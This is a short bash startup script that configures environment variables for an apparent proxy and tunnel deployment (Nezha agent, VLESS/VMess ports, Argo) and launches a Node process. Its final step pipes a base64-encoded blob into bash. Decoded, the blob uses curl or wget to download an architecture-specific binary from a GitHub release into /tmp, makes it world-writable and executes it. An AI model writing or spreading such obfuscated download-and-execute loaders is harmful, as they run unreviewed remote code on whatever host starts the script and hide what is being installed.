#!/bin/bash
export NEZHA_PORT=${NEZHA_PORT:-'443'}
export NEZHA_TLS=${NEZHA_TLS:-'1'}

export VPATH=${VPATH:-'vlss-fd80f56e-93f3-4c85'} 
export VL_PORT=${VL_PORT:-'8002'} 
export MPATH=${MPATH:-'vmss-fd80f56e-93f3-4c85'} 
export VM_PORT=${VM_PORT:-'8001'} 
export CF_IP=${CF_IP:-'ip.sb'} 
export SUB_NAME=${SUB_NAME:-'docker'} 
export FLIE_PATH=${FLIE_PATH:-'/app/worlds/'}  

export TMP_ARGO=${TMP_ARGO:-'vls'}  

generate_random_string() {
    echo "$(tr -dc a-z </dev/urandom | head -c 1)$(tr -dc a-z0-9 </dev/urandom | head -c 4)"
}
ne_file_default="nez$(generate_random_string)"
cff_file_default="cff$(generate_random_string)"
web_file_default="web$(generate_random_string)"
export ne_file=${ne_file:-$ne_file_default} 
export cff_file=${cff_file:-$cff_file_default} 
export web_file=${web_file:-$web_file_default} 

nohup node index.js >/dev/null 2>&1 &

echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01E
PSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1h
bmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAt
cU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZv
dW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgMzAKICAgICAg
ICBleGl0IDEKZmkKCmFyY2g9JCh1bmFtZSAtbSkKaWYgW1sgJGFyY2ggPT0gIng4Nl82NCIgXV07
IHRoZW4KJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25v
ZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gL3RtcC9hcHAKZWxzZQokRE9XTkxP
QURfQ01EIGh0dHBzOi8vZ2l0aHViLmNvbS9kc2Fkc2Fkc3NzL3BsdXRvbm9kZXMvcmVsZWFzZXMv
ZG93bmxvYWQveHIvbWFpbi1hcm0gPiAvdG1wL2FwcApmaQoKY2htb2QgNzc3IC90bXAvYXBwICYm
IC90bXAvYXBw
" | base64 -d | bash